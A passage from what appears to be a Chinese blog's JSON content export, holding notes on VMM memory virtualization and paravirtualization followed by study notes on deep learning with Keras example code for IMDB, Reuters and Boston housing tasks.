使用基址映射，来帮忙 CPU 找到真正的 虚拟 OS 的指令地址？正确答案是，VMM 需要提供额外的一层映射，将机器内存虚拟化一层物理内存出来，让虚拟 OS 的地址空间和真正的机器内存之间，实现映射；而且，这种实现必须是透明的； 听上去 VMM 还需要扮演类似 TLB 的地址翻译角色； 由于虚拟 OS 可能不止一个，因此 VMM 需要为每个虚拟 OS 维护一张单独的映射表，这张映射表的大小取决于初始化的时候，为虚拟 OS 分配了多少机器内存；然后虚拟 OS 对物理内存的任何写入，都由该映射表转换到对本地机器内存的写入，并在表上记录着映射关系； 问：地址转换的过程是怎么样子的？ 地址转换过程 CPU 执行应用程序（虚拟OS中的）的指令，发现 TLB 缓存未命中，触发陷阱； 陷入 VMM 的缓存未命中处理程序；VMM 找到之前保存的虚拟 OS TLB 缓存未命中处理程序的地址；加载该地址中的指令到 CPU 中； CPU 执行虚拟 OS 缓存未命中处理程序：从虚拟地址 VA 中提取 VPN 虚拟页号；查找虚拟 OS 中的页表；如果页号存在并有效，取得物理页号 PFN；更新 TLB（特权操作，将触发陷阱）； 陷入 VMM 的陷阱处理程序；VMM 将虚拟 OS 提交的 VPN 到 FPN 的映射，转换成 VPN 到 MPN 的映射，更新 TLB；返回虚拟 OS； 虚拟 OS 从陷阱返回（非特权指令尝试从陷阱返回，将触发陷阱）； 陷入 VMM；从陷阱返回应用程序； 继续执行原触发陷阱的指令（指令重试），TLB 命中； 从以上过程可以发现，不管是虚拟 OS 中的应用程序，还是虚拟 OS，它们都是运行在非特权模式下的，因此，当它们尝试执行一些特权指令时，都发触发陷阱，陷入 VMM 的陷阱处理程序； 以上过程是指软件 TLB 的场景，如果是硬件支持的 TLB，则 CPU 将直接和自己内部的 TLB 翻译器打交道，当发生 TLB 未命中时，直接按照页表基址寄存器中的地址，到机器内存中，查找相应的映射，此时 VMM 是没有机会介入的；因此，VMM 必须保存一份影子页表供硬件 TLB 查询，并密切关注虚拟 OS 对页表的所有更改；当发现更新时，第一时间更新影子页表； 当虚拟 OS 中发生缓存未命中时，其成本要大于主机 OS 的缓存未命中；为了降低成本，一种思路是 VMM 在密切关注虚拟 OS 的页表更新时，存一份类似日志的记录，里面记录着 VPN 到 FPN 并到 MPN 的映射；这样当虚拟 OS 发生缓存未命中时，VMM 直接查询自己的日志，看是否有记录到该 VPN 的映射记录，如果有的话，直接返回 MPN；这样可以省去让虚拟 OS 到它的页表查询映射的环节； 信息沟多个虚拟 OS 的时间片分配VMM 并不知道虚拟 OS 的内部状态，由于信息差，它们有时候并一定能达到最高性能的配合状态；例如当 VMM 管理多个操作系统时，有些处于空闲状态，没有任务在其中运行；有些处于繁忙的状态，有很多任务在其中运行；此时如果 VMM 为两个操作分配一样的时间片，将不是效率最高的选择； 重复页清零当 OS 为进程提供某个内存页前，通常会将其置零，以免千万信息泄露；但是对于 VMM 来说，这种置零的动作有可能会发生两次，一次由主机 OS 分配页面给 VMM，一次由虚拟 OS 分配页面给其中的进程；两次置零的操作将增加性能成本； 半虚拟化半虚拟化：如果操作系统的设计者，知道自己的 OS 将有可能运行在虚拟化的环境中，并因此提前做出相应的设计，以减少信息沟，那么将有可能极大的提高该 OS 在虚拟环境中的运行效率（提高的程度甚至将接近于主机 OS 的运行效率）； Docker 使用了操作系统层的虚拟化，它并不是一种完整的系统虚拟机，而是将内核共享给多个独立空间中的应用程序；半虚拟化的例子是 Xen 项目；好奇 Xen 如何实现半虚拟化？","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"Python 深度学习","slug":"Python 深度学习","date":"2020-08-27T01:51:00.000Z","updated":"2024-09-22T23:08:41.982Z","comments":true,"path":"2020/08/27/Python 深度学习/","permalink":"http://example.com/2020/08/27/Python%20%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"1. 什么是深度学习人工智能、机器学习和深度学习人工智能将通常由人类完成的智能任务，尽量实现自动化； 机器学习 程序设计：输入数据和计算规则，输出计算结果； 机器学习：输入数据和结果，输出计算规则； 机器学习系统是训练出来的，而不是通过程序编写出来的 从数据中学习表示机器学习的三要素：输入数据点、预期输出的示例、衡量算法好坏的方法； 机器学习的核心：在预先定义的一组方法（即 hypothesis space 假设空间）中，找到一种有意义的变换数据的方法，使得数据转换成更加有用的表示 representation ； 深度学习之“深度”深度 depth 是指学习的过程，涉及很多层级的堆叠，所以深度学习也叫 hierarchical representation learning 层级表示学习（或 layer representation learning 分层表示学习）； 分层的做法，来源于神经网络模型（neural network）启发，但事实上它跟人类大脑的神经网络模型，并没有任何关系；只是恰好用这个启发来命名这个学习模型而已； 传统的机器学习因只注重1-2层的数据表示，因此有时也叫做浅层学习 shallow learning； 深度学习可以简单理解为：学习数据表示的多级方法；每一级的方法，就像是一个蒸馏的操作，虽然每经过一级数据变得越来越少，但纯度却越来越高，跟解决任务越来越相关； 用三张图理解深度学习的工作原理权重 weight ：神经网络中，某一层对数据所做的变换操作，存储于该层的权重中；权重是一组数字，它是该层操作的参数 parameter ；每层的变换，由权重来实现参数化 parameterize ； 学习的过程，即为神经网络中的所有层，找到最合适的一组权重值，使得输入的示例，能够与目标一一对应； 损失函数 loss function ：用于计算神经网络的预测值与真实目标值之间的距离值；损失函数有时也叫目标函数 objective function； 深度学习技巧：根据损失函数计算出的距离值，作为反馈信号，对权重进行微调，以降低损失值；这种调节由优化器 optimizer 来完成，它实现了反向传播 backpropagation 的算法； 整个调节的过程，称为训练循环；通过对几千个示例，做几十次的循环后，就有可能得到损失最小的网络模型； 机器学习简史概率建模朴素贝叶斯算法：基于朴素贝叶斯定理的分类器； logistic regression 逻辑回归（简称 logreg）：名字虽然有回归两个字，其实是一种分类算法，而不是回归算法； 早期神经网络Yann LeCun 使用卷积神经网络+反向传播算法，应用于美国邮政的手写邮政编码识别；早期的神经网络算法目前都被一些更现代的算法取代了； 核方法核方法是一种分类算法，其中最有名的是 SVM 支持向量机 support vector machine；其致力于在两级不同类别的数据集合中，寻找一个良好的决策平面（边界），从而解决分类问题； 步骤： 将数据映射到高维空间； 在高维空间中找到一个超平面，该平面使得两个类别的数据点之间的距离最大化； kernel trick 核技巧：由于映射高维空间很抽象，因此，可以通过核函数（kernel function）来简化这个过程；核函数的原理是抛弃高维空间，转而求数据点对之间的距离；之后根据求得的距离结果，来寻找超平面；但这也有缺点：当数据集很大时，或需要解决感知问题时，这一思路变得不那么可行；因为如果想将 SVM 应用于感知表示，则需要先提取有用的表示（即特征工程），但这个提取过程比较麻烦，而且也不太稳定，从而限制了 SVM 的使用场景; 决策树、随机森林与梯度提升机decision tree 决策树：挑出一个待选特征，对输入数据点进行分类，如果分类的数据符合目标，则特征有意义，如果不符合，则没有意义；通过对这个过程的反复迭代，最终得到由特征判断组成的整个决策树；另外决策树也可用于给定输入预测输出； random forest 随机森林：一种决策树学习算法；它首先构建很多决策树，然后再把这些决策集成起来；对于浅层学习任务，它几乎总是第二好的算法； 步骤： 数据随机抽取； 待选特征随机抽取； 对各子树的分类结果进行投票，量多者胜； 思想：相对于决策树寻找最厉害的专家的策略，随机森林的策略为：三个臭皮匠，顶个诸葛亮； gradient boosting machine 梯度提升机：将多个弱预测模型集成起来，并通过训练循环不断改进弱预测模型；最后与决策树方法进行结合得到模型，其性质与随机森林类似，但效果更好；对于非感知问题，基本上是目前最适用的算法； 深度学习的不同点通过渐进的、逐层的方式，形成越来越复杂的表示；（貌似需要记录各层之间的依赖关系） 模型可以在同一时间共同学习所有表示层，而不是依次渐进的学习（基于前一步的不同层之间的依赖关系进行调整，但貌似计算量也很大） 决策树、随机森林和梯度提升机，都涉及到特征的提取（即特征工程），但深度学习则绕过了这个问题，它通过假设空间对每一层做简单变换，然后再根据反向传播不断微调，最终取得最好的权重值组合；（不过话说回来，怎么感觉假设空间与特征工程其实是一回事？差别在于后者没有记录依赖关系，学习的效率降低了）; 机器学习现状梯度提升机的常用框架：XGBoost； 深度学习的常用框架：Keras; 深度学习的两个核心思想卷积神经网络和反向传播，在70年代就已经提出了，但由于硬件和数据集的瓶颈，直到最近几年才开始发挥影响力； 硬件：CPU 的设计面向复杂的计算场景，使用多种指令集；GPU 的设计面向单一的使用场景，所以在特定场景中，其计算效率要远远高于 CPU；Google 则研发 TPU 进行专用的运算； 数据：由于互联网的普及，使得数据的收集变得非常容易； 算法：神经需要足够多的层数，才能发挥作用；早期没有找到有效增加层数进行梯度传播的办法；最近几年，越来越多的算法被提出，得以实现足够多的层数；包括：更好的神经层激活函数 activation function，更好的权重初始化方案 weight initialization scheme；更好的优化方案 optimization scheme；2014年以后，又增加了更好的覆盖率传播方法，例如：批标准化、残差连接、深度可分离卷积等； 2. 神经网络的数学基础初识神经网络分类问题中的某个类别叫作类 class，数据点叫做样本 sample，标签 label 用来表示样本对应某个类； 训练集（trainng set） 一般由 train_images 和 train_labels 组成；测试集（test set） 一般用 test_images 和 test_labels 组成； 神经网络的核心组件是层 layer，它是一个数据处理模块，它从输入数据中提取表示，有点像是一个数据过滤器，或者数据蒸馏器；大多数深度学习是将多个层链接起来，实现渐进式的数据蒸馏 data distillation； 在训练和测试过程中，需要指定需要监控的指标 metric，以便网络可以根据指标进行改进，拟合（fit）模型； 过拟合：学习模型是测试集上面的表现比训练集差； 神经网络的数据表示张量 tensor 是一种数据结构，用来存储输入网络的数据对象；张量是一种数字容器，可以看做是矩阵在任意维度的推广； 仅包含一个数字的张量，称为标量 scalar（也叫标量张量，零维张量，0D张量），标量张量的轴数为0； 数字组成的数组，叫做向量 vertor（也叫一维张量，1D张量），向量的轴数为1；向量（即数组）有几个元素，称为几D向量，例如5个元素称为5D向量； 向量组成的数组，叫做矩阵（也叫二维张量，2D张量），矩阵的轴数为2； 多个矩阵组成的数级，可以得到3D张量；多个3D张量组成的数组，可以得到 4D 张量，以此类推；多数深度学习使用 0D - 4D 张量的数据结构，视频处理则可能用 5D 张量； 张量的三个关键属性：轴数（即阶数，arr.ndim），形状（每个轴的维度大小, arr.shape）、数据类型(arr.dtype)； 张量切片：选择张量的特定元素；所有张量的第一个轴（即0轴）用于做样本轴（sample axis，也叫样本维度）； 深度学习模型为提高计算速度，会将数据集分成多个小批量，并行处理；每个小批量的第一个轴叫做批量轴或批量维度（其实本质和样本轴一样，只是数据量大小不同）； 几种常见的数据张量类型： 2D张量（即矩阵）：samples, features 时间序列：samples, timestamps, features 图像：samples, height, width, channels 视频：samples, frames, height, width, channels 张量运算逐元素（element-wise）运算：该运算独立应用于张量中的每个元素（因此这种运算非常适合用来做并行计算）； 广播：将轴数较小的张量，与轴数较大的张量进行运算时，小张量会在大张量的其他轴上进行广播； 张量点积 tensor product：其实它就是矩阵的乘法，背后的本质是求解多项式的应用；注意别跟逐元素的乘法弄混了； 张量变形 tensor reshaping：保持元素数量不变，但改变形状，也即 numpy 里面的 reshape，以及转置 np.transpose 张量运算可以视为几何空间中的运算；神经网络对输入数据在几何空间中做各种变换尝试，最终将原本复杂混合的数据，转换成清晰分类的数据（红纸蓝纸揉成一团后再解开的例子）； 基于梯度的优化output &#x3D; relu(dot(W, input), b)，其中 W，b 都是张量，属于该层的属性，分别对应 kernel 属性和 bias 属性；二者即该层的可训练参数 trainable parameter，或者叫权重 weight；一开始这些权重取很小的初始值，即随机初始化 random initialization； 抽取训练样本 x 和对应的目标样本 y 组成数据批量，将 x 输入网络运行得到预测值 y_pred；这一步叫做正向传播 forward pass； 由于网络中所有的运算都是可微的，因此可以计算损失相对于网络系数的梯度（张量运算的导数），之后按梯度的反方向改变网络系统大小；这一步叫做反向传播 backward pass； 随机梯度下降 stochastic gradient descent（SGD）：将参数沿着梯度的反方向随机移动一点点，从而使得损失减少一点点； 为了避免局部最小值和收敛速度问题，引入动量的概念：根据动量的概念，每次移动参数的幅度，要同时考虑加速度（斜率值）和当前速度（来自于之前的加速度），这样可以跳过局部最小点，同时加快收敛的速度； 链式法则：基于求导恒等式 (f(g(x)) = f(g(x)) * g&#96;(x)，推导出反向传播算法 back-propagation（也叫反式微分 reverse-mode differentiation），即根据最终损失值，从最顶层开始到最低层，推导每个参数对损失值的贡献大小；此处引入了符号微分 symbolic differentiation 算法，该算法可以实现：给定一个运算链，并且已知每个运算环节的导数，则可以求得整个运算链的梯度函数； 3. 神经网络入门神经网络剖析层：深度学习的基础组件不同的张量格式的不同的数据类型通常会使用到不同各类的层进行处理； 向量数据(2D)：密集层，也叫全连接层或密集连接层 图像数据(4D)：二维卷积层 序列数据(3D)：循环层 层兼容性：每一层只接收特定形状的输入，产生特定形状的输出； 模型：层构成的网络它有很多种结构，常见的如线性堆叠、双分支（two-branch）、多头（multi-head）、Inception模块等；网络的拓扑结构定义了一个假设空间，也因此限定了一系列特定的张量运算；选择合适有效的网络结构，更像是一门艺术而科学； 损失函数与优化器：配置学习过程的关键损失函数：选择正确的损失函数对解决问题至关重要，对于常见的问题，已经有一些现成的目标函数可以使用，例如二分类问题使用二元交叉熵(binary crossentropy)，序列问题使用联结主义时序分类(connectionist temporal classification)；多分类问题使用分类交叉熵(categorical crossentropy)；回归问题使用均方误差(mean-squared error)；只有真正面对全新问题的时候，才需要自主开发新的目标函数； 具有多个输出的神经网络，可能具有多个损失函数，但只能有一个损失标量值，因此需要将多个损失函数的结果取平均； Keras 简介Keras 是一模型库，因此它可以和张量库（如 TensorFlow, Theano, CNTK 等）配合使用，简化了用户的学习和上手成本； 使用 Keras 开发：概述典型的工作流程： 定义训练数据：输入张量和目标张量 定义模型（即由层组成的网络），将输入映射到目标； 配置学习过程：选择损失函数、优化器和过程中需要监控的指标； 调用模型的 fit 方法在训练数据上进行迭代； 定义模型的两种方法 使用 Sequential 类：用于层的线性堆叠，属于目前最常见的网络架构； 使用 函数式 API：通过有向无环图，用于构建任何形式的架构； 12345678910111213from keras import modelsfrom keras import layers# 使用 Sequential 构建模型model = models.Sequential()model.add(layers.Dense(32, activation=&quot;relu&quot;, input_shape=(784,)))model.add(layers.Dense(10, activation=&quot;softmax&quot;))# 使用函数式 API 构建模型input_tensor = layers.Input(shape=(784,))x = layers.Dense(32, activation=&quot;relu&quot;)(input_tensor)output_tensor = layers.Dense(10, activation=&quot;softmax&quot;)(x)model = models.Model(inputs=input_tensor, outputs=output_tensor) 配置学习过程 1234567from keras import optimizersmodel.compile( optimizer=optimizers.RMSprop(lr=0.001), loss=&quot;mse&quot;, metrics=[&quot;accuracy&quot;] ) 调用 fit 方法进行迭代训练 1model.fit(input_tensor, target_tensor, batch_size=128, epoch=10) 深度学习的原理并不复杂，最难的部分可能是根据待解决的问题，找到最适合的模型；对于常见的问题，前人们已经找到和总结了很多高效的模型；但在实际业务过程中，有可能会遇到不完全相同的问题，此时便需要在前人模型的基础，进一步调整和测试；这一步才是最难的，搞不好整个过程中都需要有一定的运气成分； 建立深度学习工作站推荐使用 Linux 系统 + GPU 机器； 虽然书上提供了在本地原生安装的方法，但其实更好的安装方式应该是使用 Docker 镜像，但可惜书上并没有提到； 电影评论分类：二分类问题导入 IMDB 数据集1234# 此处导入 keras 已经提前内置的 imdb 数据集from keras.datasets import imdb# imdb 对象的 load_data 方法可导入训练数据和测试数据，元组格式，每个元组由数据和标签两部分组成，一一对应(train_data, train_labels), (test_data, test_labels) = imdb.load_data(num_words=10000) 准备数据导入的数据只是列表，但 keras 只接收张量格式，因此需要将数据从列表格式转变成张量格式 1234567891011121314import numpy as np# 将列表转成张量，若存在某个单词，则在对应的索引位置标记1def vectorize_sequences(sequences, demension=10000): results = np.zeros((len(sequences), demension)) for i, sequence in enumerate(sequences): results[i, sequence] = 1. return resultstensor_train_data = vectorize_sequences(train_data)tensor_test_data = vectorize_sequences(test_data)tensor_train_labels = np.asarray(train_labels).astype(&#x27;float32&#x27;)tensor_test_labels = np.asarray(test_labels).astype(&#x27;float32&#x27;) 构建网络1234567891011121314151617181920212223242526272829303132333435363738394041424344from tensorflow.keras import modelsfrom tensorflow.keras import layers# 开始构建网络model = models.Sequential()# 此处的16表示使用16的隐藏单元，用来表示结果空间，16即表示空间有16个维度# 维度太高不一定好，一来计算量更大，二来有可能和训练数据过耦合，导致预测效果并不好# 维度太低则有可能没有提到出最有用的特征，导致预测准确率下降# 激活函数 relu 用来对计算结果中的负值归零，正值则保持不变model.add(layers.Dense(16, activation=&#x27;relu&#x27;, input_shape=(10000,)))model.add(layers.Dense(16, activation=&#x27;relu&#x27;))# 由于最终的目标是一个标量，1表示正面评论，0表示负面评论# 因此模型的最终输出的那层只需设置一个隐藏单元，这样就将计算结果映射到一个维度的标量中# 激活函数 sigmoid 用来对计算结果进行归一处理，这样可以表示最终的概率model.add(layers.Dense(1, activation=&quot;sigmoid&quot;))# 如果没有激活函数，则层的计算将只是 output = dot(W, input) + b 的矩阵点积计算，其结果# 将只是对数据进行简单的线性仿射变换，并没有实质性的改变数据的空间映射；而通过引入激活函数# 计算结果将不再是简单的线性变换，变成了非线性变换，因此空间映射发生了改变# 此处的模型编译使用了默认内置的优化器、损失函数和指标器，但是，这三个东西也是可以# 自定义的，即自定义优化函数、损失函数、衡量指标等；# 此处使用的损失函数为二元交叉熵 binary_crossentropy，因为最终的结果是一个二元问题，即是或者否# 因此特别适合使用二元交叉熵来做损失判断，它能够计算判断正确的概率# 如果结果并不是一个二元问题，而是一个范围问题，则应使用其他损失函数，例如均方误差 MSE，mean squared error# 它能够用来判断计算结果与预期目标的误差范围；# 另外此处使用的度量指标是准确度 accuracy，表示计算结果是否准确等于目标值；# 如果计算结果不需要准确等于目标值，而只需要控制在目标值一定范围内即可算是正确，则# 应该使用平均绝对误差 MAE，mean absolube error；model.compile( optimizer=&quot;rmsprop&quot;, loss=&quot;binary_crossentropy&quot;, metrics=[&#x27;accuracy&#x27;])# 根据问题场景的不同，内置的损失函数、度量指标、优化器不一定能够满足需求，此时# 可以使用自定义的损失函数、度量指标、优化器from keras import lossesfrom keras import metricsmodel.compile( optimizer=optimizers.RMSprop(1r=0.001), loss=losses.binary_crossentropy, metrics=[metrics.binary_accuracy]) 验证模型12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# 虽然在训练模型时将数据分为训练集和测试集，但在训练过程中，是分很多轮进行迭代训练的，这意味着每一轮都得对# 训练结果进行测试；此时不能将测试集引入测试，因为它将直接测试集被耦合进模型；因此，需要从训练集中，再拆分# 一部分数据出来，做为验证训练结果的测试数据，来训练模型；这样对最终的模型结果来说，测试集的数据仍然# 保持是前所未见的数据tensor_val_data = tensor_train_data[:10000]partial_tensor_train_data = tensor_train_data[10000:]tensor_val_labels = tensor_train_labels[:10000]partial_tensor_train_labels = tensor_train_labels[10000:]model.compile( optimizer=&quot;rmsprop&quot;, loss=&quot;binary_crossentropy&quot;, metrics=[&#x27;accuracy&#x27;])history = model.fit( partial_tensor_train_data, partial_tensor_train_labels, epochs=20, batch_size=512, validation_data=(tensor_val_data, tensor_val_labels))# 绘制图表，将训练结果可视化import matplotlib.pyplot as plt # 绘制预测损失的图表history_dict = history.historyloss_values = history_dict.get(&quot;loss&quot;)val_loss_values = history_dict.get(&quot;val_loss&quot;)epochs = range(1, len(loss_values) + 1)plt.plot(epochs, loss_values, &#x27;bo&#x27;, label=&quot;Training loss&quot;)plt.plot(epochs, val_loss_values, &#x27;b&#x27;, label=&#x27;Validation loss&#x27;)plt.title(&quot;Training and validation loss&quot;)plt.xlabel(&quot;Epochs&quot;)plt.ylabel(&quot;Loss&quot;)plt.legend()plt.show()# 绘制预测精度的图表plt.clf()acc = history_dict.get(&quot;acc&quot;)val_acc = history_dict.get(&quot;val_acc&quot;)plt.plot(epochs, acc, &#x27;bo&#x27;, label=&quot;Training acc&quot;)plt.plot(epochs, val_acc, &#x27;b&#x27;, label=&quot;Valication acc&quot;)plt.title(&quot;Training and validation accuracy&quot;)plt.xlabel(&quot;Epochs&quot;)plt.ylabel(&#x27;Accuracy&#x27;)plt.legend()plt.show() 调整模型1234567891011121314# 调整轮次重新训练网络模型，这次使用全部的训练集，没有使用验证集new_history = model.fit( tensor_train_data, tensor_train_labels, epochs=4, batch_size=512,)# 使用训练好的模型，使用测试集对其进行评估，看模型预测的准确性results = model.evaluate(tensor_test_data, tensor_test_labels)print(resutls)# 查看模型在测试集上的预测结果model.predict(tensor_test_data) 新闻分类：多分类问题总共有46个主题标签，每条新闻只属于其中的一个主题，即只拥有一个标签；因此这是一个单标签、多种类别的问题；另外对于电影，则有可能是多标签、多种类别的问题； 此处联想到图片上的目标识别，可能也可以算是一个单标签多分类的问题；因为可以假设目标物体由多个部位组成，例如由头、手、脚组成；这些部位即是目标类别，然后图片上的每一个点，有且只有可能属于其中的某个类别，或者完全不属于任何一个部位的类别； 整理数据1234567891011121314151617181920212223242526272829303132# 此处导入 keras 已经提前内置的 reuters 数据集from tensorflow.keras.datasets import reuters(train_data, train_labels), (test_data, test_labels) = reuters.load_data(num_words=10000)# 将数据张量化import numpy as npdef vectorize_sequences(sequences, demension=10000): results = np.zeros((len(sequences), demension)) for i, sequence in enumerate(sequences): results[i, sequence] = 1. return resultstensor_train_data = vectorize_sequences(train_data)tensor_test_data = vectorize_sequences(test_data)# 将标签向量化，有两种方法， 一种是将标签列表转换为整数张量，另一种是使用 one-hot 编码# one-hot 的意思就是将 n 个标签中，被命中的那个标记为 1，其他的标记为 0def to_one_hot(labels, dimension=46): results = np.zeros((len(labels), dimension)) for i, label in enumerate(labels): results[i, label] = 1. return resultsone_hot_train_labels = to_one_hot(train_labels)one_hot_test_labels = to_one_hot(test_labels)# 如果是转换为整数张量的话，则损失函数应该选择 sparse_categorical_crossentropy，即离散分类交叉熵tensor_train_data = np.array(train_data)tensor_train_labels = np.array(train_labels) 构建网络123456789101112131415161718192021# 构建网络from tensorflow.keras import modelsfrom tensorflow.keras import layers# 开始构建网络# 由于最后的结果需要将概率映射到46个标签的空间中，因此前面两层的空间不应该小于46# 此处空间隐藏单元数量取值 64，以避免计算过程中的信息丢失model = models.Sequential()model.add(layers.Dense(64, activation=&#x27;relu&#x27;, input_shape=(10000,)))model.add(layers.Dense(64, activation=&#x27;relu&#x27;))# 由于最后的目标是从46个标签中选择一个，所以此处最后一层选择的激活函数为 softmax，# 它用来计算某个样本在46种标签中，属于某一种标签的概率，46个概率的总共刚好等于 1model.add(layers.Dense(46, activation=&quot;softmax&quot;))# 此处的损失函数不再使用二元分类问题的交叉熵，而是使用多元分类问题的交叉熵# 度量指标仍然使用 accuracy，因为它本质上仍然是计算分类的准确率model.compile( optimizer=&quot;rmsprop&quot;, loss=&quot;categorical_crossentropy&quot;, metrics=[&#x27;accuracy&#x27;]) 训练模型12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758# 预留部分数据作为验证集val_data = tensor_train_data[:1000]partial_train_data = tensor_train_data[1000:]val_labels = one_hot_train_labels[:1000]partial_train_labels = one_hot_train_labels[1000:]# 训练模型history = model.fit( partial_train_data, partial_train_labels, epochs=20, batch_size=512, validation_data=(val_data, val_labels))# 绘制表格，将数据可视化import matplotlib.pyplot as plt # 绘制预测损失的图表history_dict = history.historyloss_values = history_dict.get(&quot;loss&quot;)val_loss_values = history_dict.get(&quot;val_loss&quot;)epochs = range(1, len(loss_values) + 1)plt.plot(epochs, loss_values, &#x27;bo&#x27;, label=&quot;Training loss&quot;)plt.plot(epochs, val_loss_values, &#x27;b&#x27;, label=&#x27;Validation loss&#x27;)plt.title(&quot;Training and validation loss&quot;)plt.xlabel(&quot;Epochs&quot;)plt.ylabel(&quot;Loss&quot;)plt.legend()plt.show()# 绘制预测精度的图表plt.clf()acc = history_dict.get(&quot;acc&quot;)val_acc = history_dict.get(&quot;val_acc&quot;)epochs = range(1, len(loss_values) + 1)plt.plot(epochs, acc, &#x27;bo&#x27;, label=&quot;Training acc&quot;)plt.plot(epochs, val_acc, &#x27;b&#x27;, label=&quot;Valication acc&quot;)plt.title(&quot;Training and validation accuracy&quot;)plt.xlabel(&quot;Epochs&quot;)plt.ylabel(&#x27;Accuracy&#x27;)plt.legend()plt.show()# 重新训练模型，因为从第 9 轮开始就过拟合了history = model.fit( partial_train_data, partial_train_labels, epochs=9, batch_size=512, validation_data=(val_data, val_labels))results = model.evaluate(tensor_test_data, one_hot_test_labels) 预测房价：回归问题整理数据123456789101112131415# 此处导入 keras 已经提前内置的 boston housing 数据集from tensorflow.keras.datasets import boston_housing(train_data, train_targets), (test_data, test_targets) = boston_housing.load_data()# 准备数据# 如果数据过于离散，取值范围跨度很大，虽然模型仍然可以从中进行学习# 但是这样会加大学习的难度，所以对于取值范围跨度很大的数据，最好一开始对其进行标准化操作mean = train_data.mean(axis=0)train_data -= meanstd = train_data.std(axis=0)train_data /= stdtest_data -= meantest_data /= std 构建网络12345678910111213141516from tensorflow.keras import modelsfrom tensorflow.keras import layersdef build_model(): model = models.Sequential() model.add(layers.Dense(64, activation=&#x27;relu&#x27;, input_shape=(train_data.shape[1],))) model.add(layers.Dense(64, activation=&#x27;relu&#x27;)) # 最后一层没有使用激活函数，是因为现在要解决的是一个标量回归的问题 # 因此最后一层计算出来的结果，可以直接作为目标值使用 model.add(layers.Dense(1)) model.compile( optimizer=&quot;rmsprop&quot;, loss=&quot;mse&quot;, metrics=[&#x27;mae&#x27;] ) return model 训练模型123456789101112131415161718192021222324252627282930313233import numpy as np # 使用 K 折验证，解决样本数过小的问题k = 4num_val_samples = len(train_data) // knum_epochs = 500all_mae_histories = []for i in range(k): print(&quot;processing fold: &quot;, i) val_data = train_data[i * num_val_samples : (i + 1) * num_val_samples] val_targets = train_targets[i * num_val_samples : (i + 1) * num_val_samples] partial_train_data = np.concatenate( [train_data[: i * num_val_samples], train_data[(i + 1) * num_val_samples:]], axis=0 ) partial_train_targets = np.concatenate( [train_targets[: i * num_val_samples], train_targets[(i + 1) * num_val_samples:]], axis=0 ) model = build_model() history = model.fit( partial_train_data, partial_train_targets, validation_data=(val_data, val_targets), epochs=num_epochs, batch_size=1, verbose=0) # print(history.history.keys()) # break mae_history = history.history[&#x27;val_mae&#x27;] all_mae_histories.append(mae_history) 绘制图表123456789101112131415161718192021222324252627282930average_mae_history = [ np.mean([x[i] for x in all_mae_histories]) for i in range(num_epochs)]# 绘制图表import matplotlib.pyplot as plt plt.plot(range(1, len(average_mae_history) + 1), average_mae_history)plt.xlabel(&quot;Epochs&quot;)plt.ylabel(&quot;Validation MAE&quot;)plt.show()# 去除无效值，平滑曲线def smooth_curve(points, factor=0.9): smoothed_points = [] for point in points: if smoothed_points: previous = smoothed_points[-1] smoothed_points.append(previous * factor + point * (1 - factor)) else: smoothed_points.append(point) return smoothed_points# 删除前10个数据点，因为它们跟其他点偏差过大smooth_mae_history = smooth_curve(average_mae_history[10:])plt.plot(range(1, len(smooth_mae_history) + 1), smooth_mae_history)plt.xlabel(&#x27;Epochs&#x27;)plt.ylabel(&#x27;Validation MAE&#x27;)plt.show() 重新训练12345678910111213# 训练最终的模型model = build_model()model.fit( train_data, train_targets, epochs=80, batch_size=16, verbose=0)test_mse_score, test_mae_score = model.evaluate(test_data, test_targets)print(test_mae_score) 小结 回归问题与分类问题不同；对于分类问题，要么对，要么错，因此可以使用准确率作为预测结果的度量指标；但对于回归问题，它的结果跟目标之间是以差值多少出现的，而非对或者错，因此它需要使用平均绝对误差 MAE 作为度量指标；同时它的损失函数使用均方误差 MSE 来计算； 由于回归问题的标签值是某个数值，每个值与值之间可能存在较大的取值范围，因此在使用模型学习之前，一般要对它们进行标准化处理，让它们的取值范围呈现标准化； 当样本数量比较少时，可以考虑使用 K 折验证来降低偶然因素； 如果样本数很少，模型的层数也应该尽量少一些，不然模型容易与数据产生过拟合； 4. 机器学习基础机器学习的四个分支1. 监督学习目标：学会将输入数据映射到已知目标； 分类问题：二分类、多分类； 回归问题：根据打分预测房价； 序列生成：给定一张图像，预测描述图像的文字（感觉像是多分类问题）； 语法树预测：给定一个句子，预测其生成的语法树； 目标检测：给定一张图像，在特定目标的周围画一个框； 图像分割：给定一张图像，在特定物体上画一个像素级的掩模； 2. 无监督学习 定义：没有特定目标的情况下，寻找输入数据的有趣变换； 目的：数据可视化、数据压缩、数据去噪，或者更好的理解数据的相关性；它常用于数据分析，在解决监督学习的问题之前，对数据进行分析通常是必要的，以便更好的了解数据集； 常用方法：降维（dimension reducion）、聚类（clustering）； 3. 自监督学习 定义：它是监督学习的一个特例；初始的时候，并没有输入标签，而只是给了一个启发式的算法，让机器来自己生成标签，然后靠这些标签进行自监督学习； 自监督学习的一个例子是自编码器，它用输入作为目标，来比对对数据所提取的抽象表征能否顺利的还原； 以前曾经用它来学习压缩算法，后来发现没有什么卵用，一个是压缩效率不高，二是跟输入数据强相关，在不同类型的数据上面，压缩效率急剧变差；目前研究到最有用的应用领域是图像去噪；另外一个应用是将数据降维，让其可视化，方便人类发现数据的一些有趣特征； 4. 强化学习智能体接收环境的信息，然后选择某种可以使奖励最大化的行动；目前主要在游戏领域比较成功，其他方面的应用则仍处于研究阶段； 常见术语 样本：也叫输入，进入模型的数据； 预测：也叫输出，模型给出的结果； 目标：真实准确的值，模型在理想情况下给出的结果应跟目标一致； 预测误差：也叫损失值，预测与目标之间的距离； 类别：分类问题中的一组分类标签； 标签：分类问题中的单个类别标签； 真值：也叫标注：数据集的所有目标； 二分类：预测结果只有两个类型的分类任务； 多分类：预测结果应分配到2个以上类型的分类任务； 多标签分类：预测结果可以分配多个标签的任务； 标量回归：目标是连续的标量值的任务，例如房价； 向量回归：目标是一组连续值的任务，例如图像边框检测； 小批量：模型同时进行处理的一小组样本；样本数量通常取2的幂，这样在 GPU 内存上比较好分配； 特征图：feature 